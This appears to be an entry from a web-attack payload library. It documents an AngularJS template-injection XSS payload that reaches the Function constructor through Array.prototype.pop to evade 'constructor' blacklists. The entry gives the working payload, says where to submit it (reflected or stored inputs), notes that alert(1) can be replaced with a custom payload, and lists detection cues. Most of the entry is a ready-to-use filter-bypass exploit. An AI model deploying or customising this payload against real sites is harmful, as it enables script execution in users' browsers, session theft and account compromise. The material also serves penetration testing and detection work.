---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - angularjs
  - bypass
platforms:
  - Web
validated: true
---

# AngularJS-Pop-Constructor-Alert

## Code

```javascript
{{[].pop.constructor('alert(1)')()}}
```

## Description

This payload bypasses filters on direct constructor access by chaining through the Array.prototype.pop method to reach the Function constructor, then executes alert(1). Useful when 'constructor' is blacklisted in AngularJS templates.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Self-contained; modify alert(1) for payload customization. | N/A |

## Usage

Submit in reflected or stored inputs bound to AngularJS expressions. Ideal for testing prototype chain protections.

## Detection

- Anomaly in template parsing logs showing array method chaining.
- JavaScript execution traces in browser security tools.
- Input validation alerts for pop or constructor keywords.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
